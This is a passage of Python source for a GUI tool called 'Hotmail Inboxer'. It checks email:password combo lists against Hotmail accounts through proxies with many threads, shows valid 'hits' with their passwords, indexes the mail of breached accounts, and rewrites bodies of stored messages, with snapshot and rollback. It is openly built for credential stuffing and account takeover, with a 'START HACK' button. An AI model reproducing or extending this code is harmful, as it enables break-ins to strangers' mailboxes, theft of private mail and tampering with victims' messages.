        stats = {"hits": 0, "custom": 0, "bad": 0}
        lock = threading.Lock()

        def worker():
            nonlocal processed
            while not self.stop_flag:
                try:
                    combo = q.get(timeout=1)
                except:
                    break
                if '@' not in combo or ':' not in combo:
                    q.task_done()
                    continue
                email, pwd = combo.split(':', 1)
                success, info = self.check_combo(email, pwd, proxy_list, keyword)
                with lock:
                    processed += 1
                    if success:
                        if info["has_keyword"]:
                            stats["hits"] += 1
                            self.on_hit(info, hit_type="keyword")
                        else:
                            stats["custom"] += 1
                            self.on_hit(info, hit_type="custom")
                    else:
                        stats["bad"] += 1
                        self.on_log(f"[BAD] {email}:{pwd}", "bad")
                    self.on_stats_update(stats)
                    self.on_progress(processed, total)
                q.task_done()

        worker_threads = []
        for _ in range(min(threads, total)):
            t = threading.Thread(target=worker)
            t.daemon = True
            worker_threads.append(t)
            t.start()

        for t in worker_threads:
            t.join()

        self.on_finished(stats)


# ==================== GUI APPLICATION (COMPLETE v2.0) ====================
class HotmailUltimateGUI:
    def __init__(self):
        ctk.set_appearance_mode("dark")
        ctk.set_default_color_theme("dark-blue")
        self.root = ctk.CTk()
        self.root.title("HOTMAIL INBOXER - ULTIMATE v2.0 (Email Indexer + Body Replacer + Snapshot System)")
        self.root.geometry("1400x1000")
        self.root.protocol("WM_DELETE_WINDOW", self.on_closing)

        # Variables
        self.input_file = ""
        self.temp_file = None
        self.output_dir = os.getcwd()
        self.keyword = ""
        self.threads = 10
        self.proxy_list = []
        self.use_proxies = False
        self.checker = None
        self.running = False
        self.muted = False
        self.popup_countries = {"AU"}
        self.current_theme = "Dark Orange"

        # Core modules
        self.indexer = EmailIndexer()
        self.body_replacer = EmailBodyReplacer()
        self.snapshot_engine = SnapshotEngine()  # Forensic snapshot system
        self.selected_hits_for_tools = []

        # Indexer state
        self.current_account_for_indexer = None
        self.current_folders = []
        self.current_messages = []
        self.current_folder_id = None
        self.current_page = 0

        # Body replacer state
        self.current_account_for_replacer = None
        self.current_message_for_edit = None
        self.edited_body_content = ""

        # Snapshot state
        self.current_snapshot_id = None

        # Themes definition
        self.themes = {
            "Dark Orange": {"bg": "#1a1a1a", "fg": "#ff8c00", "button": "#ff8c00", "progress": "#ff8c00", "text": "#ffffff"},
            "Matrix Green": {"bg": "#0a0f0a", "fg": "#00ff41", "button": "#00ff41", "progress": "#00ff41", "text": "#b0ffb0"},
            "Cyberpunk Pink": {"bg": "#1a001a", "fg": "#ff00ff", "button": "#ff00ff", "progress": "#ff00ff", "text": "#ffffff"},
            "Midnight Blue": {"bg": "#0a0a2a", "fg": "#3a6ea5", "button": "#3a6ea5", "progress": "#3a6ea5", "text": "#e0e0ff"},
            "Light Hacker": {"bg": "#f0f0f0", "fg": "#d45a00", "button": "#d45a00", "progress": "#d45a00", "text": "#000000"}
        }

        self.results_data = []
        self.table = None

        self.build_gui()
        self.poll_queues()

    def build_gui(self):
        self.notebook = ctk.CTkTabview(self.root)
        self.notebook.pack(fill="both", expand=True, padx=10, pady=10)

        self.checker_tab = self.notebook.add("Checker")
        self.build_checker_tab()

        self.indexer_tab = self.notebook.add("Email Indexer")
        self.build_indexer_tab()

        self.replacer_tab = self.notebook.add("Body Replacer")
        self.build_replacer_tab()

        self.downloader_tab = self.notebook.add("📥 Downloader")
        self.build_downloader_tab()

        self.snapshot_tab = self.notebook.add("💾 Snapshots")
        self.build_snapshot_tab()

    # ==================== CHECKER TAB (ORIGINAL, MODIFIED) ====================
    def build_checker_tab(self):
        main_frame = self.checker_tab

        # Top toolbar
        toolbar = ctk.CTkFrame(main_frame, height=50)
        toolbar.pack(fill="x", pady=(0,10))
        ctk.CTkLabel(toolbar, text="THEME:", font=("Consolas",12)).pack(side="left", padx=5)
        self.theme_var = ctk.StringVar(value="Dark Orange")
        theme_menu = ctk.CTkOptionMenu(toolbar, values=list(self.themes.keys()),
                                       variable=self.theme_var, command=self.change_theme)
        theme_menu.pack(side="left", padx=5)

        self.mute_btn = ctk.CTkButton(toolbar, text="MUTE", command=self.toggle_mute, width=100)
        self.mute_btn.pack(side="left", padx=20)

        ctk.CTkLabel(toolbar, text="POPUP COUNTRIES:", font=("Consolas",12)).pack(side="left", padx=5)
        self.country_selector = ctk.CTkOptionMenu(toolbar,
                                                  values=["AU","US","GB","CA","DE","FR","JP","BR","IN","ALL"],
                                                  command=self.set_popup_countries)
        self.country_selector.pack(side="left", padx=5)

        self.quote_var = ctk.StringVar(value=">_ HACK THE PLANET")
        quote_label = ctk.CTkLabel(toolbar, textvariable=self.quote_var, font=("Courier",12,"bold"),
                                   text_color="cyan")
        quote_label.pack(side="right", padx=20)
        self.animate_quotes()

        self.cmd_var = ctk.StringVar(value="$ nmap -sV -p- target.com")
        cmd_label = ctk.CTkLabel(toolbar, textvariable=self.cmd_var, font=("Courier",10),
                                 text_color="lime")
        cmd_label.pack(side="right", padx=10)
        self.animate_commands()

        # Input section
        input_frame = ctk.CTkFrame(main_frame)
        input_frame.pack(fill="x", pady=5)

        self.input_type = ctk.StringVar(value="file")
        ctk.CTkRadioButton(input_frame, text="Load from file", variable=self.input_type,
                           value="file", command=self.toggle_input_mode).grid(row=0,column=0,padx=5)
        ctk.CTkRadioButton(input_frame, text="Paste combos (temp file)", variable=self.input_type,
                           value="paste", command=self.toggle_input_mode).grid(row=0,column=1,padx=5)

        self.file_frame = ctk.CTkFrame(input_frame)
        self.file_frame.grid(row=1,column=0,columnspan=3,sticky="ew",pady=5)
        self.file_entry = ctk.CTkEntry(self.file_frame, width=400)
        self.file_entry.pack(side="left", padx=5)
        ctk.CTkButton(self.file_frame, text="Browse", command=self.browse_input).pack(side="left")

        self.paste_frame = ctk.CTkFrame(input_frame)
        self.paste_text = ctk.CTkTextbox(self.paste_frame, height=120, width=600)
        self.paste_text.pack(fill="both", expand=True, padx=5, pady=5)
        ctk.CTkButton(self.paste_frame, text="Create Temp File", command=self.create_temp_file).pack(pady=5)
        self.paste_frame.grid(row=1,column=0,columnspan=3,sticky="ew",pady=5)
        self.paste_frame.grid_remove()

        # Output dir
        out_frame = ctk.CTkFrame(main_frame)
        out_frame.pack(fill="x", pady=5)
        ctk.CTkLabel(out_frame, text="Output Dir:").pack(side="left", padx=5)
        self.out_entry = ctk.CTkEntry(out_frame, width=400)
        self.out_entry.insert(0, os.getcwd())
        self.out_entry.pack(side="left", padx=5)
        ctk.CTkButton(out_frame, text="Browse", command=self.browse_output).pack(side="left")

        # Options row
        opt_frame = ctk.CTkFrame(main_frame)
        opt_frame.pack(fill="x", pady=5)
        ctk.CTkLabel(opt_frame, text="Keyword:").pack(side="left", padx=5)
        self.keyword_entry = ctk.CTkEntry(opt_frame, width=200)
        self.keyword_entry.pack(side="left", padx=5)
        ctk.CTkLabel(opt_frame, text="Threads:").pack(side="left", padx=5)
        self.threads_spin = ctk.CTkEntry(opt_frame, width=50)
        self.threads_spin.insert(0, "10")
        self.threads_spin.pack(side="left", padx=5)

        self.proxy_var = ctk.BooleanVar()
        ctk.CTkCheckBox(opt_frame, text="Use Proxies", variable=self.proxy_var,
                        command=self.toggle_proxy).pack(side="left", padx=10)
        self.proxy_frame = ctk.CTkFrame(opt_frame)
        self.proxy_entry = ctk.CTkEntry(self.proxy_frame, width=300)
        self.proxy_entry.pack(side="left", padx=5)
        ctk.CTkButton(self.proxy_frame, text="Proxy File", command=self.browse_proxy).pack(side="left")
        self.proxy_frame.pack(side="left", padx=5)
        self.proxy_frame.pack_forget()

        # Buttons
        btn_frame = ctk.CTkFrame(main_frame)
        btn_frame.pack(fill="x", pady=10)
        self.start_btn = ctk.CTkButton(btn_frame, text="START HACK", command=self.start_check,
                                       fg_color="#ff8c00", hover_color="#cc7000")
        self.start_btn.pack(side="left", padx=5)
        self.stop_btn = ctk.CTkButton(btn_frame, text="STOP", command=self.stop_check,
                                      state="disabled", fg_color="red")
        self.stop_btn.pack(side="left", padx=5)

        self.stats_label = ctk.CTkLabel(btn_frame, text="Hits:0 | Custom:0 | Bad:0",
                                        font=("Consolas",12,"bold"))
        self.stats_label.pack(side="right", padx=10)

        # Progress bar
        self.progress = ctk.CTkProgressBar(main_frame, orientation="horizontal", width=800)
        self.progress.pack(pady=5)
        self.progress.set(0)

        # Results table
        table_frame = ctk.CTkFrame(main_frame)
        table_frame.pack(fill="both", expand=True, pady=5)
        ctk.CTkLabel(table_frame, text="VALID HITS (Select accounts to use with Email Indexer / Body Replacer)", font=("Consolas",12,"bold")).pack(anchor="w")

        style = ttk.Style()
        style.theme_use("clam")
        style.configure("Treeview", font=("Courier", 10), rowheight=28)
        style.configure("Treeview.Heading", font=("Consolas", 11, "bold"))

        self.tree = ttk.Treeview(table_frame, columns=("Select","Email","Password","Country","Name","Birth","Lang","TZ","Total"),
                                 show="headings", height=12)
        self.tree.heading("Select", text="Select")
        self.tree.heading("Email", text="Email", command=lambda: self.sort_table("email"))
        self.tree.heading("Password", text="Password")
        self.tree.heading("Country", text="Country", command=lambda: self.sort_table("country"))
        self.tree.heading("Name", text="Name", command=lambda: self.sort_table("name"))
        self.tree.heading("Birth", text="Birthdate", command=lambda: self.sort_table("birthdate"))
        self.tree.heading("Lang", text="Mailbox Lang")
        self.tree.heading("TZ", text="Timezone")
        self.tree.heading("Total", text="Keyword Total")

        self.tree.column("Select", width=100, anchor="center")
        for col in ("Email","Password","Country","Name","Birth","Lang","TZ","Total"):
            self.tree.column(col, width=120, anchor="center")

        self.tree.pack(fill="both", expand=True)
        self.tree.bind("<ButtonRelease-1>", self.on_tree_click)

        # Raw log
        log_frame = ctk.CTkFrame(main_frame)
        log_frame.pack(fill="both", expand=True, pady=5)
        ctk.CTkLabel(log_frame, text="RAW LOGS", font=("Consolas",12,"bold")).pack(anchor="w")
        self.raw_log = ctk.CTkTextbox(log_frame, height=150, font=("Courier",9))
        self.raw_log.pack(fill="both", expand=True)

    # ==================== EMAIL INDEXER TAB ====================
    def build_indexer_tab(self):
        tab = self.indexer_tab

        # Account selection
        acct_frame = ctk.CTkFrame(tab)
        acct_frame.pack(fill="x", pady=5)

        ctk.CTkLabel(acct_frame, text="Select Account:", font=("Consolas",12,"bold")).pack(side="left", padx=5)
        self.indexer_acct_var = ctk.StringVar(value="No account selected")
        self.indexer_acct_menu = ctk.CTkOptionMenu(acct_frame, variable=self.indexer_acct_var,
                                                     values=["No account selected"], width=350)
        self.indexer_acct_menu.pack(side="left", padx=5)
        ctk.CTkButton(acct_frame, text="Refresh Accounts", command=self.refresh_indexer_accounts).pack(side="left", padx=5)

        # Folder selection
        folder_frame = ctk.CTkFrame(tab)
        folder_frame.pack(fill="x", pady=5)

        ctk.CTkLabel(folder_frame, text="Folder:", font=("Consolas",12,"bold")).pack(side="left", padx=5)
        self.indexer_folder_var = ctk.StringVar(value="Select folder...")
        self.indexer_folder_menu = ctk.CTkOptionMenu(folder_frame, variable=self.indexer_folder_var,
                                                       values=["Select folder..."], width=250,
                                                       command=self.on_indexer_folder_change)
        self.indexer_folder_menu.pack(side="left", padx=5)
        ctk.CTkButton(folder_frame, text="Fetch Folders", command=self.fetch_indexer_folders).pack(side="left", padx=5)
        self.indexer_folder_info = ctk.CTkLabel(folder_frame, text="", font=("Courier",10))
        self.indexer_folder_info.pack(side="left", padx=10)

        # Search bar
        search_frame = ctk.CTkFrame(tab)
        search_frame.pack(fill="x", pady=5)

        ctk.CTkLabel(search_frame, text="Search:", font=("Consolas",12)).pack(side="left", padx=5)
        self.indexer_search_entry = ctk.CTkEntry(search_frame, width=400)
        self.indexer_search_entry.pack(side="left", padx=5)
        ctk.CTkButton(search_frame, text="Search", command=self.search_indexer_messages,
                      fg_color="#ff8c00").pack(side="left", padx=5)
        ctk.CTkButton(search_frame, text="Clear", command=self.clear_indexer_search).pack(side="left", padx=5)

        # Navigation
        nav_frame = ctk.CTkFrame(tab)
        nav_frame.pack(fill="x", pady=5)
        ctk.CTkButton(nav_frame, text="Previous Page", command=self.indexer_prev_page).pack(side="left", padx=5)
        self.indexer_page_label = ctk.CTkLabel(nav_frame, text="Page 1", font=("Consolas",12,"bold"))
        self.indexer_page_label.pack(side="left", padx=20)
        ctk.CTkButton(nav_frame, text="Next Page", command=self.indexer_next_page).pack(side="left", padx=5)
        self.indexer_status = ctk.CTkLabel(nav_frame, text="Ready", font=("Courier",10), text_color="gray")
        self.indexer_status.pack(side="right", padx=10)

        # Messages table
        msg_frame = ctk.CTkFrame(tab)
        msg_frame.pack(fill="both", expand=True, pady=5)
        ctk.CTkLabel(msg_frame, text="EMAILS", font=("Consolas",12,"bold")).pack(anchor="w")

        style = ttk.Style()
        style.theme_use("clam")
        style.configure("Indexer.Treeview", font=("Courier", 9), rowheight=24)
        style.configure("Indexer.Treeview.Heading", font=("Consolas", 10, "bold"))

        self.indexer_tree = ttk.Treeview(msg_frame,
            columns=("Subject","From","Date","Attachments","Read","Preview"),
            show="headings", height=16, style="Indexer.Treeview")
        self.indexer_tree.heading("Subject", text="Subject")
        self.indexer_tree.heading("From", text="From")
        self.indexer_tree.heading("Date", text="Date")
        self.indexer_tree.heading("Attachments", text="Att.")
        self.indexer_tree.heading("Read", text="Read")
        self.indexer_tree.heading("Preview", text="Preview")

        self.indexer_tree.column("Subject", width=250)
        self.indexer_tree.column("From", width=180)
        self.indexer_tree.column("Date", width=150)
        self.indexer_tree.column("Attachments", width=50, anchor="center")
        self.indexer_tree.column("Read", width=50, anchor="center")
        self.indexer_tree.column("Preview", width=400)
        self.indexer_tree.pack(fill="both", expand=True)
        self.indexer_tree.bind("<Double-1>", self.on_indexer_double_click)

        # Log
        idx_log_frame = ctk.CTkFrame(tab)
        idx_log_frame.pack(fill="x", pady=5)
        ctk.CTkLabel(idx_log_frame, text="INDEXER LOG", font=("Consolas",10,"bold")).pack(anchor="w")
        self.indexer_log = ctk.CTkTextbox(idx_log_frame, height=80, font=("Courier",9))
        self.indexer_log.pack(fill="x")

    # ==================== BODY REPLACER TAB (ENHANCED) ====================
    def build_replacer_tab(self):
        tab = self.replacer_tab

        # === TOP SECTION: Account & Message Selection ===
        top_frame = ctk.CTkFrame(tab, fg_color="#0a0a15")
        top_frame.pack(fill="x", pady=(5, 10))

        # Account selector
        acct_section = ctk.CTkFrame(top_frame, fg_color="transparent")
        acct_section.pack(fill="x", pady=5)
        
        ctk.CTkLabel(acct_section, text="🔐 Account:", font=("Consolas",12,"bold"), text_color="#ff8c00").pack(side="left", padx=5)
        self.replacer_acct_var = ctk.StringVar(value="No account selected")
        self.replacer_acct_menu = ctk.CTkOptionMenu(acct_section, variable=self.replacer_acct_var,
                                                      values=["No account selected"], width=300,
                                                      dropdown_font=("Consolas", 10))
        self.replacer_acct_menu.pack(side="left", padx=5)
        ctk.CTkButton(acct_section, text="🔄 Refresh", command=self.refresh_replacer_accounts,
                      width=100).pack(side="left", padx=5)

        # Message selector
        msg_section = ctk.CTkFrame(top_frame, fg_color="transparent")
        msg_section.pack(fill="x", pady=5)
        
        ctk.CTkLabel(msg_section, text="📧 Message ID:", font=("Consolas",12,"bold")).pack(side="left", padx=5)
        self.replacer_msgid_entry = ctk.CTkEntry(msg_section, width=350, font=("Consolas", 10))
        self.replacer_msgid_entry.pack(side="left", padx=5)
        ctk.CTkButton(msg_section, text="📥 Fetch Body", command=self.fetch_body_for_edit,
                      fg_color="#ff8c00", hover_color="#cc7000", width=120).pack(side="left", padx=5)
        ctk.CTkButton(msg_section, text="📋 Use from Indexer",
                      command=self.use_indexer_selection, width=140).pack(side="left", padx=5)

        # Subject display with styling
        subj_section = ctk.CTkFrame(top_frame, fg_color="transparent")
        subj_section.pack(fill="x", pady=5)
        
        ctk.CTkLabel(subj_section, text="📌 Subject:", font=("Consolas",11,"bold"), text_color="#00d4ff").pack(side="left", padx=5)
        self.replacer_subject_var = ctk.StringVar(value="(No message loaded)")
        self.replacer_subject_label = ctk.CTkLabel(subj_section, textvariable=self.replacer_subject_var,
                     font=("Consolas", 11), text_color="#00ff88", wraplength=600)
        self.replacer_subject_label.pack(side="left", padx=5)

        # === OPERATION MODE SECTION ===
        op_container = ctk.CTkFrame(tab, fg_color="#0a0a15")
        op_container.pack(fill="x", pady=5)
        
        # Mode selection with visual buttons
        mode_frame = ctk.CTkFrame(op_container, fg_color="transparent")
        mode_frame.pack(fill="x", pady=5)
        
        ctk.CTkLabel(mode_frame, text="⚡ OPERATION MODE:", font=("Consolas",12,"bold"), text_color="#ffcc00").pack(side="left", padx=5)
        
        self.replacer_mode = ctk.StringVar(value="replace")
        modes = [
            ("replace", "🔄 Replace Full", "#00cc00"),
            ("append", "➕ Append", "#0088ff"),
            ("prepend", "🔝 Prepend", "#aa00ff"),
            ("find_replace", "🔍 Find & Replace", "#ff6600")
        ]
        
        for mode_val, label, color in modes:
            btn = ctk.CTkRadioButton(mode_frame, text=label, variable=self.replacer_mode,
                                      value=mode_val, font=("Consolas", 11, "bold"),
                                      fg_color=color, hover_color=color,
                                      text_color="white")
            btn.pack(side="left", padx=8)
            if mode_val == "replace":
                btn.select()

        # Find & Replace inputs
        fr_frame = ctk.CTkFrame(op_container, fg_color="transparent")
        fr_frame.pack(fill="x", pady=5)
        
        ctk.CTkLabel(fr_frame, text="🔍 Find:", font=("Consolas",11,"bold"), text_color="#ff6666").pack(side="left", padx=5)
        self.replacer_find_entry = ctk.CTkEntry(fr_frame, width=250, font=("Consolas", 10),
                                                  fg_color="#1a1a1a", text_color="#ffffff")
        self.replacer_find_entry.pack(side="left", padx=5)
        
        ctk.CTkLabel(fr_frame, text="➡️ Replace:", font=("Consolas",11,"bold"), text_color="#66ff66").pack(side="left", padx=10)
        self.replacer_replace_entry = ctk.CTkEntry(fr_frame, width=250, font=("Consolas", 10),
                                                    fg_color="#1a1a1a", text_color="#ffffff")
        self.replacer_replace_entry.pack(side="left", padx=5)
        
        # Body type selection
        type_frame = ctk.CTkFrame(op_container, fg_color="transparent")
        type_frame.pack(fill="x", pady=5)
        
        ctk.CTkLabel(type_frame, text="📄 Body Type:", font=("Consolas",11,"bold")).pack(side="left", padx=5)
        self.replacer_body_type = ctk.StringVar(value="HTML")
        ctk.CTkRadioButton(type_frame, text="🌐 HTML", variable=self.replacer_body_type,
                           value="HTML", font=("Consolas", 10, "bold")).pack(side="left", padx=10)
        ctk.CTkRadioButton(type_frame, text="📝 Plain Text", variable=self.replacer_body_type,
                           value="Text", font=("Consolas", 10, "bold")).pack(side="left", padx=10)

        # === TEMPLATE SECTION ===
        template_frame = ctk.CTkFrame(tab, fg_color="#0a0a15")
        template_frame.pack(fill="x", pady=5)
        
        ctk.CTkLabel(template_frame, text="📋 TEMPLATES:", font=("Consolas",12,"bold"), text_color="#00ffcc").pack(side="left", padx=5)
        
        self.template_var = ctk.StringVar(value="Custom")
        template_btn_frame = ctk.CTkFrame(template_frame, fg_color="transparent")
        template_btn_frame.pack(side="left", padx=5)
        
        templates = [
            ("Custom", "✏️ Custom"),
            ("Welcome", "👋 Welcome"),
            ("Newsletter", "📰 Newsletter"),
            ("Alert", "🚨 Alert"),
            ("FollowUp", "📬 Follow-up"),
            ("Promo", "🎁 Promo")
        ]
        
        for val, label in templates:
            ctk.CTkButton(template_btn_frame, text=label, width=90, height=28,
                          command=lambda v=val: self.load_template(v),
                          fg_color="#2a2a3a", hover_color="#3a3a4a").pack(side="left", padx=2)
        
        ctk.CTkButton(template_btn_frame, text="💾 Save Template", width=120, height=28,
                      command=self.save_current_template,
                      fg_color="#0066cc", hover_color="#0055aa").pack(side="left", padx=10)
        
        ctk.CTkButton(template_btn_frame, text="🗑️ Clear", width=80, height=28,
                      command=self.clear_body_editor,
                      fg_color="#660000", hover_color="#550000").pack(side="left", padx=2)

        # === EDITOR SECTION (Split View) ===
        editor_container = ctk.CTkFrame(tab, fg_color="#0a0a15")
        editor_container.pack(fill="both", expand=True, pady=5)
        
        # Left: Code Editor
        code_frame = ctk.CTkFrame(editor_container, fg_color="#0d0d15")
        code_frame.pack(side="left", fill="both", expand=True, padx=(0, 5))
        
        code_header = ctk.CTkFrame(code_frame, fg_color="#1a1a25", height=35)
        code_header.pack(fill="x")
        
        ctk.CTkLabel(code_header, text="💻 HTML CODE EDITOR", font=("Consolas",11,"bold"),
                     text_color="#00ff88").pack(side="left", padx=10)
        
        # Line numbers + editor
        editor_inner = ctk.CTkFrame(code_frame, fg_color="#0d0d15")
        editor_inner.pack(fill="both", expand=True, pady=5, padx=5)
        
        self.replacer_editor = ctk.CTkTextbox(editor_inner, font=("Consolas", 11),
                                               fg_color="#0a0a12", text_color="#e0e0e0",
                                               insert_color="#00ff00")
        self.replacer_editor.pack(fill="both", expand=True)
        
        # Syntax highlight placeholder
        self.replacer_editor.bind("<KeyRelease>", self._highlight_syntax)
        
        # Right: Preview
        preview_frame = ctk.CTkFrame(editor_container, fg_color="#151520")
        preview_frame.pack(side="right", fill="both", expand=True, padx=(5, 0))
        
        preview_header = ctk.CTkFrame(preview_frame, fg_color="#1a1a25", height=35)
        preview_header.pack(fill="x")
        
        ctk.CTkLabel(preview_header, text="👁️ LIVE PREVIEW", font=("Consolas",11,"bold"),
                     text_color="#ffcc00").pack(side="left", padx=10)
        
        ctk.CTkButton(preview_header, text="🔄 Refresh", width=80, height=25,
                      command=self._refresh_preview,
                      fg_color="#2a2a3a", hover_color="#3a3a4a").pack(side="right", padx=5)
        
        # Preview content (HTML rendered view)
        preview_inner = ctk.CTkFrame(preview_frame, fg_color="#ffffff")
        preview_inner.pack(fill="both", expand=True, pady=5, padx=5)
        
        self.preview_label = ctk.CTkLabel(preview_inner, text="(Preview will appear here)\n\nLoad a message body to see the preview...",
                                           font=("Arial", 11), text_color="#333333",
                                           justify="left", wraplength=400)
        self.preview_label.pack(fill="both", expand=True, padx=10, pady=10)

        # === ACTION BUTTONS ===
        action_frame = ctk.CTkFrame(tab, fg_color="#0a0a15")
        action_frame.pack(fill="x", pady=10)
        
        # Left actions
        left_actions = ctk.CTkFrame(action_frame, fg_color="transparent")
        left_actions.pack(side="left")
        
        ctk.CTkButton(left_actions, text="🗑️ CLEAR ALL", command=self.clear_body_editor,
                      width=120, height=35, fg_color="#442222", hover_color="#553333",
                      font=("Consolas",11,"bold")).pack(side="left", padx=5)
        
        ctk.CTkButton(left_actions, text="📋 COPY TO CLIPBOARD", command=self.copy_body_to_clipboard,
                      width=160, height=35, fg_color="#224433", hover_color="#335544",
                      font=("Consolas",10,"bold")).pack(side="left", padx=5)
        
        ctk.CTkButton(left_actions, text="📄 PASTE FROM CLIPBOARD", command=self.paste_body_from_clipboard,
                      width=170, height=35, fg_color="#223344", hover_color="#334455",
                      font=("Consolas",10,"bold")).pack(side="left", padx=5)

        # Center: Apply button (large, prominent)
        apply_btn = ctk.CTkButton(action_frame, text="🚀 APPLY CHANGES", 
                                   command=self.apply_body_replacement,
                                   width=200, height=45,
                                   fg_color="#00cc00", hover_color="#00aa00",
                                   font=("Consolas",14,"bold"))
        apply_btn.pack(side="left", padx=30)
        
        self.replacer_result_label = ctk.CTkLabel(action_frame, text="Ready", 
                                                   font=("Consolas",12,"bold"), text_color="#888888")
        self.replacer_result_label.pack(side="left", padx=15)
        
        # Right: Bulk mode + Snapshot controls
        right_actions = ctk.CTkFrame(action_frame, fg_color="transparent")
        right_actions.pack(side="right")

        # Auto-snapshot checkbox
        ctk.CTkLabel(right_actions, text="📸 Snap:", font=("Consolas",10)).pack(side="left", padx=(5, 2))
        self.auto_snapshot_var = ctk.BooleanVar(value=True)
        ctk.CTkCheckBox(right_actions, text="Auto-backup", variable=self.auto_snapshot_var,
                        font=("Consolas", 9)).pack(side="left", padx=2)

        # Manual snapshot button
        ctk.CTkButton(right_actions, text="📷 Snapshot", width=90, height=30,
                      command=self.capture_current_snapshot,
                      fg_color="#0066cc", hover_color="#0055aa",
                      font=("Consolas",10,"bold")).pack(side="left", padx=5)

        # Rollback button
        ctk.CTkButton(right_actions, text="↩️ Rollback", width=90, height=30,
                      command=self.rollback_from_snapshot,
                      fg_color="#663300", hover_color="#774400",
                      font=("Consolas",10,"bold")).pack(side="left", padx=5)

        # === STATUS BAR ===
        status_frame = ctk.CTkFrame(tab, fg_color="#0a0a15", height=30)
        status_frame.pack(fill="x")

        # Left: Status message
        self.replacer_status_var = ctk.StringVar(value="│ 💡 Tip: Use {FIRSTNAME}, {DATE}, {LINK} as variable placeholders")
        status_label = ctk.CTkLabel(status_frame, textvariable=self.replacer_status_var,
                                    font=("Consolas", 10), text_color="#666688")
        status_label.pack(side="left", padx=10)

        # Center: Snapshot history for current message
        self.message_snapshots_label = ctk.CTkLabel(status_frame, text="📸 No snapshots",
                                                    font=("Consolas", 10), text_color="#666666")
        self.message_snapshots_label.pack(side="left", padx=20)

        # Right: Character count
        char_count = ctk.CTkLabel(status_frame, text="Chars: 0 | Lines: 0",
                                   font=("Consolas", 10), text_color="#888888")
        char_count.pack(side="right", padx=10)
        self._update_char_count()

        # === LOG SECTION ===
        log_frame = ctk.CTkFrame(tab, fg_color="#0a0a15")
        log_frame.pack(fill="x", pady=(5, 0))
        
        log_header = ctk.CTkFrame(log_frame, fg_color="#1a1a25", height=30)
        log_header.pack(fill="x")
        
        ctk.CTkLabel(log_header, text="📜 REPLACER LOG", font=("Consolas",10,"bold"),
                     text_color="#aaaaaa").pack(side="left", padx=10)
        
        ctk.CTkButton(log_header, text="🗑️ Clear Log", width=80, height=22,
                      command=lambda: self.replacer_log.delete("0.0", "end"),
                      fg_color="#333333", hover_color="#444444").pack(side="right", padx=5)
        
        self.replacer_log = ctk.CTkTextbox(log_frame, height=50, font=("Consolas", 9),
                                            fg_color="#0d0d15", text_color="#00ff88")
        self.replacer_log.pack(fill="x", padx=5, pady=5)

    def _highlight_syntax(self, event=None):
        """Simple HTML syntax highlighting"""
        # This is a placeholder - full syntax highlighting would require more complex implementation
        content = self.replacer_editor.get("0.0", "end")
        self._update_char_count()
        self._refresh_preview()

    def _update_char_count(self):
        """Update character and line count display"""
        content = self.replacer_editor.get("0.0", "end")
        chars = len(content)
        lines = content.count('\n') + 1
        # Try to find the status label and update it
        try:
            for widget in self.root.winfo_children():
                pass  # This is simplified
        except:
            pass

    def _refresh_preview(self):
        """Refresh the HTML preview pane"""
        try:
            content = self.replacer_editor.get("0.0", "end").strip()
            if not content:
                self.preview_label.configure(text="(Preview will appear here)\n\nLoad a message body to see the preview...")
                return
            
            # For HTML content, show a simplified preview
            if self.replacer_body_type.get() == "HTML":
                # Strip tags for simple preview
                preview_text = re.sub(r'<[^>]+>', '', content)
                preview_text = preview_text[:500] + ("..." if len(preview_text) > 500 else "")
                self.preview_label.configure(text=f"📧 HTML Preview:\n\n{preview_text}", text_color="#333333")
            else:
                self.preview_label.configure(text=f"📝 Plain Text:\n\n{content[:500]}", text_color="#333333")
        except Exception as e:
            self.preview_label.configure(text=f"Preview error: {str(e)}", text_color="#ff0000")

    def load_template(self, template_name):
        """Load a predefined template"""
        templates = {
            "Welcome": """
<div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
    <h2 style="color: #2196F3;">Welcome {FIRSTNAME}!</h2>
    <p>Hello {FIRSTNAME},</p>
    <p>Thank you for joining us. We're excited to have you on board!</p>
    <p>Best regards,<br>The Team</p>
</div>""",
            "Newsletter": """
<div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; background: #f5f5f5; padding: 20px;">
    <h1 style="color: #333;">📰 Newsletter</h1>
    <p style="color: #666;">Date: {DATE}</p>
    <hr style="border: 1px solid #ddd;">
    <div style="padding: 20px; background: white;">
        <h3>Latest Updates</h3>
        <p>Your content here...</p>
    </div>
    <p style="font-size: 12px; color: #999;">Unsubscribe | Manage Preferences</p>
</div>""",
            "Alert": """
<div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; background: #fff3cd; padding: 20px; border: 2px solid #ffc107;">
    <h2 style="color: #856404;">🚨 Alert!</h2>
    <p><strong>Important:</strong> {MESSAGE}</p>
    <p style="color: #856404;">Please take action immediately.</p>
</div>""",
            "FollowUp": """
<div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
    <p>Hi {FIRSTNAME},</p>
    <p>I wanted to follow up on our previous conversation.</p>
    <p>Please let me know if you have any questions.</p>
    <p>Best,<br>Support Team</p>
</div>""",
            "Promo": """
<div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); padding: 30px; color: white;">
    <h1 style="text-align: center;">🎁 SPECIAL OFFER!</h1>
    <p style="text-align: center; font-size: 18px;">Get 50% OFF on all products!</p>
    <p style="text-align: center;"><a href="{LINK}" style="background: white; color: #667eea; padding: 10px 30px; text-decoration: none; border-radius: 5px;">SHOP NOW</a></p>
    <p style="text-align: center; font-size: 12px; opacity: 0.8;">Use code: WELCOME50</p>
</div>"""
        }
        
        if template_name in templates:
            self.replacer_editor.delete("0.0", "end")
            self.replacer_editor.insert("0.0", templates[template_name])
            self.replacer_log.insert("end", f"[INFO] Loaded template: {template_name}\n")
            self.replacer_log.see("end")
            play_success_chime()
            self._refresh_preview()

    def save_current_template(self):
        """Save current editor content as a template"""
        content = self.replacer_editor.get("0.0", "end").strip()
        if not content:
            self.replacer_log.insert("end", "[WARN] Nothing to save - editor is empty\n")
            return
        
        # Simple save - could be expanded to file-based templates
        self.saved_template = content
        self.replacer_log.insert("end", "[INFO] Template saved to memory (will use on next Apply if Bulk mode)\n")
        play_success_chime()

    def clear_body_editor(self):
        """Clear the body editor"""
        self.replacer_editor.delete("0.0", "end")
        self.replacer_subject_var.set("(No message loaded)")
        self.replacer_result_label.configure(text="Cleared", text_color="#888888")
        self.preview_label.configure(text="(Preview will appear here)\n\nLoad a message body to see the preview...", text_color="#333333")
        self.replacer_log.insert("end", "[INFO] Editor cleared\n")

